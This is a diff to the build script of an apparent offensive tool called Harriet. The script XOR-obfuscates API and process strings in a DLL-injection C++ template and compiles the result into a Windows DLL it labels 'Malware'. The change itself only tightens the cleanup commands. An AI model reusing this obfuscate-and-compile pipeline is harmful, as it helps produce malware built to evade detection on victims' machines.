@@ -116,7 +116,7 @@ sed -i "s/XOR_VARIABLE/$XOR_VARIABLE/g" Harriet/DLLInj/Resources/template.cpp
 cat /proc/sys/kernel/random/uuid | sed 's/[-]//g' | head -c 20 > virtualalloc.txt
 VIRT_ALLOC=$(cat "virtualalloc.txt")
 sed -i "s/Alloc_Virtual/$VIRT_ALLOC/g" Harriet/DLLInj/Resources/template.cpp
-rm virt*
+rm -f virt*.txt
 
 #VIRTUALALLOC - XOR String
 
@@ -125,7 +125,7 @@ python3 Harriet/DLLInj/Resources/xor.py virt.txt > virtalloc.txt
 virt=$(cat virtalloc.txt)
 virt2="${virt::-8}" 
 sed -i "s/VIRALO/$virt2/g" Harriet/DLLInj/Resources/template.cpp 
-rm virt*
+rm -f virt*.txt
 
 #PROCESS STRING
 
@@ -134,7 +134,7 @@ python3 Harriet/DLLInj/Resources/xor.py proc.txt > proc2.txt
 process=$(cat proc2.txt)
 process2="${process::-8}" 
 sed -i "s/PROCY/$process2/g" Harriet/DLLInj/Resources/template.cpp 
-rm proc*
+rm -f proc*.txt
 
 
 #Compiling Malware
@@ -142,7 +142,7 @@ echo -e ${yellow}"+++Compiling Malware+++"${clear}
 x86_64-w64-mingw32-g++ -shared -o $MALWARE Harriet/DLLInj/Resources/template.cpp -lcomctl32 -Wl,--subsystem,windows -fpermissive -Wno-narrowing -O2 -O3 >/dev/null 2>&1
 echo ""
 sleep 2
-rm shell*
+rm -f shell*.txt
 echo -e ${yellow}"***Malware Compiled***"${clear}
 echo ""
 sleep 2
